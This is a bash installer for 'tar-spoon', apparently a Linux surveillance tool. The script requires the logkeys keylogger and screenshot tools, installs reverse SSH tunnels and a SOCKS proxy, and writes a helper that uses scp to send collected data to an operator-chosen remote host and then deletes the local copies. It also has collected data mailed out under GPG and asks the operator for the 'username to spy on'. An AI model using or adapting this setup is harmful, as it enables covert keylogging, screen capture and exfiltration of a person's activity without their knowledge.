#!/bin/bash

# todo: archlinux PKGBUILD for tar-spoon
echo "Please make sure these are installed: sudo, systemd, ssmtp, mutt, imagemagick, logkeys, wicd, gpg"
echo "Logkeys can be found here: http://code.google.com/p/logkeys/source/checkout"
echo -n "Press enter to continue..."
read

echo "Enter file server to put encrypted collected data on over SSH."
echo "Consider restricting user shell, chroot jail and other limitations on the user that is capable of shipping files"
echo "Ideally, replace file over SSH approach with more appropriate (note that the files are encrypted anyway)!"
echo "It is better to use IP here."
read rhost

echo "Where is the key to put files at the remote via scp?"
read key

echo "What is the remote user name?"
read ruser

echo "#!/bin/bash
      scp -ri ${key} /tmp/yaourt-tmp-root/scrot/package/* ${ruser}@${rhost}:/tmp/ && rm -f \"/tmp/yaourt-tmp-root/scrot/package/*\"" > /usr/local/bin/tsp_mv

echo "Enter desired local ssh SOCKS proxy port (empty to skip that step)" 
read SOCKS_PROXY_PORT
if [[ ! -z $SOCKS_PROXY_PORT ]]; then
	sudo assets/bin/mksocks.sh $SOCKS_PROXY_PORT
fi

echo "Installing reverse ssh tunnels [invoking sudo]"
for TUNNEL in `sudo assets/bin/mktunnels.sh` ; do
	echo "Tunnel: $TUNNEL"
done

sudo mkdir -p /usr/local/etc/tarspoon
sudo touch /usr/local/etc/tarspoon/receiver.name
sudo touch /usr/local/etc/tarspoon/receiver.mail
echo -n "guest" > /tmp/user.local
sudo mv /tmp/user.local /usr/local/etc/tarspoon/

echo "*** IF YOU WANT TO AUTOMATE THIS STEP, SEND PULL REQUEST AT https://github.com/manpages/tar-spoon ***"
echo "Heads up! You will need to generate keypair that the program will use to transport dumped information over mail."
echo "  Import the pubkey with the ultimate trust to the local root keyring;"
echo "  Put name assigned to that keyring into /usr/local/etc/tarspoon/receiver.name;"
echo "  Target email address into /usr/local/etc/tarspoon/receiver.mail."

echo "*** IF YOU WANT TO AUTOMATE THIS STEP, SEND PULL REQUEST AT https://github.com/manpages/tar-spoon ***"
echo "Heads up!"
echo "  You will need to configure username to spy on (default is guest)"
echo "  Put it into /usr/local/etc/tarspoon/user.local"
